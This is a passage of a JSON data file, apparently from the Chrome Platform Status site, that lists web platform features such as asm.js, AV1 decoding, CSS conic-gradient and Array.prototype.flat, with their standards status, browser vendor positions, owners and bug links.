      "spec": "http://asmjs.org/spec/latest/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://hacks.mozilla.org/2015/03/asm-speedups-everywhere/",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "bradnelson@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/v8/issues/detail?id=4203",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://dev.windows.com/en-us/microsoft-edge/platform/status/asmjs",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/?#feature-asm.js",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Validate asm.js code and use type information to optimize the low-level subset of JavaScript.",
    "id": 5053365658583040,
    "resources": {
      "docs": [
        "http://asmjs.org/"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-09-20 18:07:28.694870",
      "by": "Patket@microsoft.com"
    },
    "name": "history.index",
    "tags": [
      "history",
      "index"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/multipage/history.html#dom-history-index",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "domenic@chromium.org",
          "panicker@chromium.org",
          "japhet@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=758068",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public skepticism",
          "val": 6
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/whatwg/html/issues/2710#issuecomment-322004671",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "history.index is a counterpart to history.length, giving the index of the current entry in the joint session history.",
    "id": 5733738818306048,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-12-14 17:38:27.997320",
      "by": "jmedley@google.com"
    },
    "name": "messageerror event and event handlers",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1359017#c2",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "binji@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>HTML"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=714582",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The messageerror event is a new event, with an associated onmessageerror handler attached to the window, message ports, broadcast channels, and workers.\r\n\r\nThe purpose of the event is to notify the receiver when a posted message could not be decoded. Currently the only use of this is when a SharedArrayBuffer is sent but cannot be shared, but there are also plans to use for other objects that want the same property (WebAssembly modules, for example).",
    "id": 5729005244252160,
    "resources": {
      "docs": [
        "https://github.com/whatwg/html/pull/2530",
        "https://developer.mozilla.org/en-US/docs/Web/API/WindowEventHandlers",
        "https://developer.mozilla.org/en-US/docs/Web/API/WindowEventHandlers/onmessageerror"
      ],
      "samples": [
        "https://github.com/w3c/web-platform-tests/issues/5567"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-05-11 00:14:05.715210",
      "by": "rakina@google.com"
    },
    "name": "openfind Event",
    "tags": [
      "findinpage"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/mozilla/standards-positions/issues/83",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "rakina@chromium.org",
          "domenic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=819919",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A new DOM Event, openfind, will be sent to webpages when find-in-page UI is invoked by user. Webpages can cancel the event so that the browser’s find-in-page UI will not be shown, and instead show their own custom find-in-page UI.\r\n",
    "id": 6636647374389248,
    "resources": {
      "docs": [
        "https://github.com/rakina/find-in-page-api/blob/master/README.md",
        "https://goo.gl/FtjuPu"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:07.250470",
      "by": "ericbidelman@google.com"
    },
    "name": "overflow-anchor",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://lists.w3.org/Archives/Public/www-style/2012Jun/0347.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "mikelawther@chromium.org",
          "esprehn@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/162185",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Stick the visible view of an element to the bottom/top even as new content expands its size.",
    "id": 5865619656278016,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-02-20 05:55:12.726940",
      "by": "ksakamoto@chromium.org"
    },
    "name": "srcset and imgsizes attributes on link rel=preload",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "ksakamoto@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Loader"
        ],
        "flag": false,
        "bug": "https://crbug.com/813452",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Add srcset and imgsizes attributes to <link rel=preload as=image>, that correspond to the srcset and sizes attributes of HTMLImageElement. We are using imgsizes here instead of sizes because it already has a different meaning for HTMLLinkElement in the rel=icon case.\r\n",
    "id": 5164259990306816,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1wob4u9AER1kmUodqIEp78BuziSJChBl54A5ZRXPRCUI/edit#"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:44.637360",
      "by": "ericbidelman@google.com"
    },
    "name": "window.open() throws on an invalid URL parameter",
    "comments": "WPT tests are part of the url/ directory which blink doesn't import\r\n\r\nUseCounter: https://www.chromestatus.com/metrics/feature/timeline/popularity/1909",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/#apis-for-creating-and-navigating-browsing-contexts-by-name:parse-a-url",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "jochen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>HTML"
        ],
        "flag": false,
        "bug": "https://crbug.com/708135",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/whatwg/html/issues/2490",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Currently, we only log a message to the console. For consistency with other APIs, the WhatWG spec now requires that window.open throws a DOMException \"SyntaxError\" instead.",
    "id": 5636515271016448,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-07-03 08:06:54.543340",
      "by": "yosin@chromium.org"
    },
    "name": "<rp> is display:none",
    "comments": "So far, <rp> is display:none if it is in <ruby> as in UA style sheet: ruby > rp { display:none }\r\nAfter launching this, <rp> is display:none even if outside of <ruby>.",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://html.spec.whatwg.org/multipage/rendering.html#non-replaced-elements",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 70
        },
        "owners": [
          "yosin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 70,
        "blink_components": [
          "Blink>HTML"
        ],
        "desktop": 70,
        "flag": false,
        "android": 70,
        "bug": "http://crbug.com/859416",
        "intervention": false
      },
      "opera": {
        "android": 69,
        "desktop": 69
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "<rp> element is display:none as in UA style sheet: rp { display:none }\r\n\r\nOther browsers:\r\n- Edge: display:inline (outside <ruby>), display:none (inside <ruby>)\r\n- Firefox: display:none\r\n- Safari: display:inline, display:none (inside <ruby>)",
    "id": 5454252407259136,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-06-07 18:18:11.046551",
      "by": "rtoy@chromium.org"
    },
    "name": "WebAudio: MediaElement and MediaStream nodes defined only for AudioContext",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 70
        },
        "owners": [
          "rtoy@chromium.org",
          "hoch@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 70,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 70,
        "flag": false,
        "android": 70,
        "bug": "http://crbug.com/845913",
        "intervention": false
      },
      "opera": {
        "android": 57,
        "desktop": 57
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Chrome historically allowed creation of MediaElementAudioSourceNode's, MediaStreamAudioSourceNode's, and MediaStreamAudioDestinationNode's using an OfflineAudioContext.  This does not comply with the spec; these nodes should only be available for an AudioContext.  The behavior with an OfflineAudioContext is not well-defined and contrary to the real-time nature of the nodes themselves.\r\n\r\nThus, only allow these nodes to be constructed for an AudioContext.",
    "id": 5258622686724096,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#mediaelementaudiosourcenode",
        "https://webaudio.github.io/web-audio-api/#mediastreamaudiosourcenode",
        "https://webaudio.github.io/web-audio-api/#mediastreamtrackaudiosourcenode",
        "https://webaudio.github.io/web-audio-api/#mediastreamaudiodestinationnode"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-06-21 00:14:21.317442",
      "by": "jaikk@chromium.org"
    },
    "first_of_milestone": true,
    "name": "AV1 Decode",
    "tags": [
      "AV1",
      "aomedia",
      "libaom",
      "codec",
      "video"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://aomedia.org/av1-bitstream-and-decoding-process-specification/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1314147",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "jaikk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Internals>Media"
        ],
        "desktop": 69,
        "flag": false,
        "bug": "http://crbug.com/838380",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://www.cnet.com/news/netflix-youtube-streaming-video-is-about-to-get-a-lot-faster-av1-compression/",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "url": "https://9to5mac.com/2018/01/04/apple-alliance-for-open-media/",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "AV1 is a next generation codec developed by the Alliance for Open Media [1]. This intent to implement proposes adding a decoder (libaom) into Chrome Desktop stable channel after the bitstream has been finalized. \r\n\r\n[1] http://aomedia.org/",
    "id": 5729898442260480,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-26 16:36:46.498747",
      "by": "orphis@google.com"
    },
    "name": "Add RTCRtpParameters.headerExtensions",
    "tags": [
      "rtp",
      "headerextensions",
      "rtcrtpsender",
      "getparameters"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webrtc-pc/#rtcrtpparameters",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "orphis@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 69,
        "blink_components": [
          "Blink>WebRTC>PeerConnection"
        ],
        "desktop": 69,
        "flag": false,
        "android": 69,
        "bug": "https://crbug.com/803494",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add support for the required dictionary entry RTCRtpParameters.headerExtensions that is returned by RTCRtpSender.getParameters().\r\n\r\nThis is a read-only field that allows inspection of the parameters that are set on a PeerConnection after negotiation. ",
    "id": 6675724865896448,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-12 16:50:46.040045",
      "by": "jmedley@google.com"
    },
    "name": "Array.prototype.{flat,flatMap}",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tc39.github.io/proposal-flatMap/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "mathias@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 69,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "desktop": 69,
        "flag": false,
        "android": 69,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=7220",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "JavaScript arrays are getting two new methods.\r\n\r\n`Array.prototype.flat()` returns a new array with all sub-array elements concatenated into it recursively up to the specified depth. The sub-array elements become members of the new array.\r\n\r\n`Array.prototype.flatMap` first maps each element using a mapping function, then flattens the result into a new array. It is identical to a map followed by a flatten of depth 1.",
    "id": 6629507075145728,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2018/03/smooshgate"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-06-26 12:42:43.974379",
      "by": "majidvp@google.com"
    },
    "name": "CSS Scroll Snap Points",
    "tags": [
      "css",
      "scrolling",
      "snap points"
    ],
    "comments": "As of June 2018: IE, Edge, and Firefox ship a deprecated version of the specification, Safari ships the current CR specification which is what Chrome implements as well.\r\n\r\n\r\nMore info on different versions: https://gist.github.com/majido/9900261e1b7e2b1eb180b01c03656b42",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-scroll-snap",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Scroll_Snap_Points",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "majidvp@chromium.org",
          "sunyunjia@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 69,
        "blink_components": [
          "Blink>Scroll"
        ],
        "desktop": 69,
        "flag": false,
        "android": 69,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=497851",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://twitter.com/grorgwork/status/578310070401806336",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "CSS scroll snap specification introduces snap points as a way to \"enforce the scroll offsets that a scroll container's visual viewport may end at after a scrolling operation has completed\". Scroll snapping applies to both user scroll operations such as touch, wheel scrolling, or scrollbar dragging, and programmatic scroll operations such as Element.scrollTo().\r\n",
    "id": 5721832506261504,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Scroll_Snap_Points"
      ],
      "samples": [
        "https://webdesign.tutsplus.com/tutorials/how-to-scroll-snap-using-css--cms-30333"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-06-20 23:19:52.792563",
      "by": "fmalita@chromium.org"
    },
    "name": "CSS conic-gradient",
    "tags": [
      "conic-gradient",
      "repeating-conic-gradient"
    ],
    "comments": "While CSS Image Values and Replaced Content Module Level 4 is still in WD phase, the conic-gradient section has been approved for shipping: https://www.w3.org/2018/03/07-css-minutes.html#item12",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://www.w3.org/TR/css-images-4/#conic-gradients",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1175958",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "fmalita@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 69,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 69,
        "flag": false,
        "android": 69,
        "bug": "http://crbug.com/502970",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/conicgradients/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-conic-gradients",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Add support for CSS conic (a.k.a. angular/sweep) gradients.\r\n\r\nConic gradient color stops are angle-positioned and define an (angular) gradient transition between rays.",
    "id": 5706155347148800,
    "resources": {
      "samples": [
        "https://leaverou.github.io/conic-gradient/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-06-29 20:49:43.692984",
      "by": "rego@igalia.com"
    },
    "name": "CSS logical flow relative margins, paddings and borders",
    "tags": [
      "css-logical"
    ],
    "comments": "https://www.smashingmagazine.com/2018/03/understanding-logical-properties-values/",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-logical-1/#box",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/41",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "obrufau@igalia.com",
          "rego@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 69,
        "flag": false,
        "bug": "https://crbug.com/850000",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "url": "https://wpdev.uservoice.com/forums/257854-microsoft-edge-developer/suggestions/7438435-css-logical-properties",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=185977",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Implement margin-{block,inline}-{start,end}, padding-{block,inline}-{start,end} and border-{block,inline}-{start,end}-{width,style,color} using the standard names. They're currently supported using the -webkit prefix and slightly different names. Only longhand properties will be implemented as part of this and also the shorthands border-{block,inline}-{start,end} that are already supported with -webkit prefix.\r\n",
    "id": 6041507983261696,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/docs/Web/CSS/CSS_Logical_Properties"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-07-02 23:37:40.505760",
      "by": "beccahughes@google.com"
    },
    "name": "Display cutout and CSS env() support",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-env-1/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 69
        },
        "owners": [
          "beccahughes@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "android": 69,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=825890",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/blog/7929/designing-websites-for-iphone-x/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Adds support for display cutouts in Chrome through CSS environment variables and the viewport-fit meta tag. This allows developers to take advantage of the entire screen on devices that have a display cutout.",
    "id": 5710044637167616,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1lbZi18_5cMlLOphpFqTbuI4B0YGykQvvtRbw6j67UyE/edit",
        "https://www.w3.org/TR/css-round-display-1/#viewport-fit-descriptor",
        "https://drafts.csswg.org/css-env-1/"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-06-21 20:37:54.945442",
      "by": "jmedley@google.com"
    },
    "name": "EME: Query what encryption schemes are supported",
    "tags": [
      "EME",
      "Encrypted"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 69
        },
        "owners": [
          "jrummell@chromium.org",
          "joeyparrish@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Media"
        ],
        "desktop": 69,
        "flag": true,
        "bug": "http://crbug.com/838416",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "url": "https://discourse.wicg.io/t/proposal-further-work-on-encrypted-media-extensions/2623/2",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://discourse.wicg.io/t/proposal-further-work-on-encrypted-media-extensions/2623/5",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A new method will allow applications to query whether a specific encryption scheme is supported by Encrypted Media Extensions (EME).",
    "id": 5184416120832000,
    "resources": {
      "docs": [
        "https://github.com/WICG/encrypted-media-encryption-scheme/blob/master/explainer.md"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-15 16:45:47.607677",
      "by": "jmedley@google.com"
    },
    "name": "ES Modules for dedicated workers ('module' type option)",
    "tags": [
      "module",
      "worker"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/workers.html#workeroptions",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1247687",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 69
        },
        "owners": [
          "nhiroki@chromium.org",
          "kouhei@chromium.org",
          "hiroshige@chromium.org",
          "domenic@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 69,
        "blink_components": [
          "Blink>Workers"
        ],
        "desktop": 69,
        "flag": true,
        "android": 69,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=680046",
        "intervention": false
      },
      "opera": {
        "android": 56,
        "desktop": 56
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=164860",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "JavaScript will support modules in dedicated workers. Using a new value for the constructor's type attribute, worker scripts are loaded as ES6 modules and the import statement is available on worker contexts. With this feature, web developers can more easily write programs in a composable way and share them among a page and workers.",
    "id": 5761300827209728,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-06-26 08:24:34.360628",
      "by": "rakina@google.com"
    },
    "name": "Element.toggleAttribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dom.spec.whatwg.org/#dom-element-toggleattribute",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
